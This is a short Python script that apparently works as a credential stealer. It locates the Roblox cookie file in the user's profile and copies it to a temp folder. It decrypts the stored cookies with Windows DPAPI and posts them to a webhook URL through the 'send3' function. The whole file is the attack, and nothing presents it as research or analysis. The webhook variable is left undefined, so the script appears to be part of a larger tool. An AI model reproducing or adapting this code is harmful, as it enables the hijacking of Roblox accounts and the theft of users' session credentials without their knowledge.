import os
import shutil
import json
import base64
import requests
import win32crypt

def retrieve_roblox_cookies():
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")

    if not os.path.exists(roblox_cookies_path):
        return
    
    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    shutil.copy(roblox_cookies_path, destination_path)

    with open(destination_path, 'r', encoding='utf-8') as file:
        try:
            file_content = json.load(file)
            
            encoded_cookies = file_content.get("CookiesData", "")
            
            if encoded_cookies:
                decoded_cookies = base64.b64decode(encoded_cookies)
                
                try:
                    decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
                    return decrypted_cookies.decode('utf-8', errors='ignore')
                except Exception as e:
                    return f"Error decrypting with DPAPI: {e}"
            else:
                return "Error: No 'CookiesData' found in the file."
        
        except json.JSONDecodeError as e:
            return f"Error while parsing JSON: {e}"
        except Exception as e:
            return f"Error: {e}"

def send3(webhook_url, message):
    data = {
        "content": message
    }
    response = requests.post(webhook_url, json=data)
    if response.status_code == 204:
        print("Message sent successfully!")
    else:
        print(f"Failed to send message. Status code: {response.status_code}")
        print(response.text)

cookies = retrieve_roblox_cookies()
send3(webh, str(cookies))